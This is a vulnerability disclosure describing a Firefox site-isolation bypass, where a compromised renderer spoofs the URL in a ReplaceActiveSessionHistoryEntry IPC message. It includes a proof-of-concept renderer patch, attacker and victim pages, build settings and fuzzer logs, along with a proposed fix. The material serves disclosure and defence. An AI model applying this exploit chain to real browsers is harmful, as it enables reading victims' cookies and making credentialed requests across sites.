# Site Isolation Bypass in Firefox

A compromised renderer process can spoof the URL in a `ReplaceActiveSessionHistoryEntry` message to the browser process to create an origin confusion in the browser process thus bypassing site isolation.

## Cause

The `ReplaceActiveSessionHistoryEntry` function offered by the `PContentParent` IPC interface allows the renderer process (`PContentChild`) to submit changes to the current history state. It is part of the implementation of the `history.replaceState(state, unused, url)` method of the browser API. For security reasons `url` must be valid and same-origin to the current URL. However, this security check is only implemented in the renderer process. An attacker that has exploited a memory bug in the renderer process and has achieved RCE can send a malicious IPC message to the browser process, that contains a cross-site URL.
For the following explanation the website used by the attacker will be `https://attacker.com` and the victim website will be `https://www.victim.com`.

The malicious IPC message is processed in `mozilla::ipc::IPCResult ContentParent::RecvReplaceActiveSessionHistoryEntry(const MaybeDiscarded<BrowsingContext>& aContext, SessionHistoryInfo&& aInfo)` in `dom/ipc/ContentParent.cpp`. There, the function `void CanonicalBrowsingContext::ReplaceActiveSessionHistoryEntry(SessionHistoryInfo* aInfo)` (`docshell/base/CanonicalBrowsingContext.cpp`) is called, which replaces the history state.

By sending a `ReplaceActiveSessionHistoryEntry` IPC message with the cross-site URL `https://victim.com` and subsequently calling `location.reload();` the attacker can trick the browser process to load the cross-site document in the current compromised renderer process associcated to the site `https://attacker.com`, thus bypassing site isolation. The attacker still has RCE in the process because the process was not replaced. But the privileged browser process now assigns the site `https://victim.com` to the renderer. Thus, the attacker can for example read the cookies from and send credentialed fetch requests to `victim.com`.  

_`RecvReplaceActiveSessionHistoryEntry` could also be affected._
## Steps to reproduce

1. Start two HTTP servers, using 127.0.0.1 for the attacker and 127.0.0.2 for the victim
    - `cd attacker && python3 -m http.server --bind 127.0.0.1 8080` hosting attacker.html
    - `cd victim && python3 -m http.server --bind 127.0.0.2 8080` hosting victim.html
2. Patch the renderer process to simulate the compromised renderer process
    - checkout and build a current version of Firefox (e.g. `c00a6f0cea53ee7b285abb8157f764cecc52dd28`)
    - must be not a debug build, because assertions in the renderer process detect the bug and crash the process
    - replace the method `PContentChild::SendReplaceActiveSessionHistoryEntry` in the generated `PContentChild.cpp` as outlined in the [patch below](#renderer-patch). The patch modifies the uri of the transmitted `SessionHistoryInfo`.
3. Browse the attacker website `./mach run http://127.0.0.1:8080/attacker.html` and observe the processes.
    - in `about:processes` we can observe the attacker process being reused for the victim site
    - observe that the title of the tab that the victim page is loaded in, still shows the URL of the attacker website

```html
<!-- attacker page: http://127.0.0.1:8080/attacker.html --->
<html>
  <body>
    <h1>Attacker page</h1>

    <script>
      (async function () {
        await window.history.replaceState("foo", "bar", null);
        await window.location.reload();
      })();
    </script>
  </body>
</html>
```

```html
<!-- victim page: http://127.0.0.2:8080/victim.html --->
<html>
  <body>
    <h1>Victim page</h1>
  </body>
</html>
```

### Renderer Patch

```cpp
// release/ipc/ipdl/PContentChild.cpp

auto PContentChild::SendReplaceActiveSessionHistoryEntry(
        const MaybeDiscardedBrowsingContext& context,
        const SessionHistoryInfo& info) -> bool
{
    UniquePtr<IPC::Message> msg__ = PContent::Msg_ReplaceActiveSessionHistoryEntry(MSG_ROUTING_CONTROL);
    IPC::MessageWriter writer__{
            (*(msg__)),
            this};

    // PATCH
    SessionHistoryInfo newInfo(info);
    nsCOMPtr<nsIURI> uri;
    nsresult rv = NS_NewURI(getter_AddRefs(uri), "http://127.0.0.2:8080/victim.html"_ns);
    newInfo.SetURI(uri);

    IPC::WriteParam((&(writer__)), context);
    // Sentinel = 'context'
    ((&(writer__)))->WriteSentinel(199164678);
    IPC::WriteParam((&(writer__)), newInfo);
    // Sentinel = 'info'
    ((&(writer__)))->WriteSentinel(70058413);

    if (mozilla::ipc::LoggingEnabledFor("PContent", mozilla::ipc::ChildSide)) {
        mozilla::ipc::LogMessageForProtocol(
            "PContentChild",
            this->ToplevelProtocol()->OtherPidMaybeInvalid(),
            "Sending ",
            msg__->type(),
            mozilla::ipc::MessageDirection::eSending);
    }
    AUTO_PROFILER_LABEL("PContent::Msg_ReplaceActiveSessionHistoryEntry", OTHER);

    bool sendok__ = ChannelSend(std::move(msg__));
    return sendok__;
}
```

mozconfig:
```
export MOZ_PACKAGE_JSSHELL=1

ac_add_options --with-app-name=firefox
mk_add_options MOZ_APP_NAME=firefox
mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/release

# Enable ASan specific code and build workarounds
ac_add_options --enable-address-sanitizer

# These three are required by ASan
ac_add_options --disable-jemalloc
ac_add_options --disable-crashreporter
ac_add_options --disable-elf-hack

# Keep symbols to symbolize ASan traces later
export MOZ_DEBUG_SYMBOLS=1
ac_add_options --enable-debug-symbols
ac_add_options --disable-install-strip

# Settings for an opt build (preferred)
# The -gline-tables-only ensures that all the necessary debug information for ASan
# is present, but the rest is stripped so the resulting binaries are smaller.
ac_add_options --enable-optimize="-O2 -gline-tables-only"
ac_add_options --disable-debug
```

## Affected Versions
Discovered in Firefox v121. Reproduced in recent build of bookmarks/central (`c00a6f0cea53ee7b285abb8157f764cecc52dd28`). We therefore assume, that all versions between 121 and 128 are affected. Versions before 121 are probably also affected.

## Fix
The function `void CanonicalBrowsingContext::ReplaceActiveSessionHistoryEntry(SessionHistoryInfo* aInfo)` (`docshell/base/CanonicalBrowsingContext.cpp`) should include a security check, which verifies that `aInfo->mURI` is valid and same-origin to the current URL.

# Appendix

- detectable by the leak sanitizer or the process sanitizer
- tested in Firefox 121 & 128 (gecko-dev master be29044bb9265c8e84bf67bf79f351998318e060)
    - reproducible in optimised builds with(-out) ASAN
    - not reproducible in debug builds, attacker renderer crashes

## Steps to reproduce using IPC fuzzer
- start servers: `ATTACKER=vulns/firefox_force_load/attacker VICTIM=vulns/firefox_force_load/victim tmuxp load server_session.yml`
- open seed page and attacker page (in [firefox directory](./firefox-ipc-fuzzing)): `MOZ_LOG="uxss_logger:5" ./mach run http://127.0.0.2:8080/seed http://127.0.0.1:8080/attacker.html`
    - delete profile before repeating: `rm -rf release/tmp/profile-default/`

logs:
```
[Child 1530782: Main Thread]: I/my_ipc_logger IPCFuzzer: ::mozilla::ipc::StandardURLParams spec, replaced url: http://127.0.0.2:8080/victim.html#32154352
[time: 1716296577380009][1530782->1530557] [PContentChild] Sending  PContent::Msg_ReplaceActiveSessionHistoryEntry
```

